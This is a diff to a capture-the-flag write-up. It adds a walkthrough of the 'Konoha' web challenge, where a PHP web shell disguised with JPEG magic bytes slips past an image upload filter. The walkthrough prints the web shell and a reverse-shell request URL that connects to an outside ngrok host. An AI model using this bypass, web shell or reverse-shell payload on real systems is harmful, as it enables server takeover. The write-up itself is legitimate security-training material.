@@ -11,8 +11,8 @@ https://hackmd.io/@RedTeamTG/acdfctf-final-2023
 #### Web
 - Grandline
 - Image Lookup
-- DPO Agba
 - Konoha
+- DPO Agba
   
 #### Cryptography
 - What's going on 
@@ -112,3 +112,33 @@ here is the final request to have the flag:
 ```http://51.20.91.159/source.php?file=Sup3rs3cr3tFlag.txt&key=Kismet-Abzee-Berrywuzh3r3```
 
 The flag has unfortunately been removed from the server. I unfortunately didn't take a picture when I solved it but the request on the picture still exact.
+
+- Konoha:
+
+<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/8.png" alt="img"></p>
+
+the images from the web server are no longer accessible I'm going to do a writeup for you a little blindly lol, I would have liked to add more illustrations but hey it doesn't matter, let's go.
+
+The first step was to decode the obfuscated data in the source code. Cyberchef made it possible:
+
+<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/9.png" alt="img"></p>
+
+when we analyze the result we can see that we have a way to upload images to the server using the upload.php file. What better way to have a shell!.
+Unfortunately when we tried to upload our image, we have restrictions that prevent us from uploading php files or anything other than images and in addition the file size must not exceed more than 35 bytes. Here we need to bypass this restriction.
+
+We can trick the filter into thinking the .php file I want to upload is actually a .jpeg file. But I had to modify our file's header like this.
+
+our initial payload: ```<?php system($_GET['cmd']); ?>```
+
+but to make that work we have to change the header to that of a .jpeg file. Checking it up online I found this “FF D8 FF EE”. So, let’s change the header to that; hexed.it does the trick.
+
+<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/10.png" alt="img"></p>
+
+our final image content should look like this: ```ÿØÿî<?php system($_GET['cmd']); ?>```
+
+Now, that we have successfully changed the header we can upload our file "cmd.php"
+
+after that I just launched a reverse shell on my computer using a TCP connection with an ngrock server. So I was able to have a shell. The next step was to look for the flag on the server. I spent a lot of time looking for the flag before finding it one of the files present on the server. 
+
+Here is the payload that I used to get the shell:
+```http://16.170.159.222/images/cmd.php?cmd=php+-r+'$sock%3dfsockopen("tcp://4.tcp.ngrok.io",16205)%3bexec("sh+<%263+>%263+2>%263")%3b'```
